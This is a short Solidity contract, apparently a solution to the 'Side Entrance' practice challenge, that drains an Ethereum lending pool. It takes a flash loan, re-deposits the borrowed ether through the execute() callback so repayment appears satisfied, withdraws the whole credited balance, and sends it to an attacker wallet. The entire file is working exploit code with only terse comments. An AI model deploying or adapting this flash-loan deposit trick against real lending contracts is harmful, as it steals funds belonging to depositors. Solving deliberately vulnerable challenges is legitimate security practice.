//SPDX-License-Identifier: MIT 

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external ;
    function deposit() external payable;
    function withdraw() external;
}
contract SideEntranceAttack {

    ISideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    ///function to begin attack 
    function attack(uint256 _amount,address attacker) external {
        ///begin the attack with calling flashLoan
        pool.flashLoan(_amount);

        ///withdraw
        pool.withdraw();

        ///send the fund to attacker wallet
        (bool success,)=attacker.call{value:address(this).balance}("");
        require(success);
    }

    ///function named execute() to called by pool contract
    function execute() external payable {
        ///deposit to pool
        pool.deposit{value:address(this).balance}();
    }
}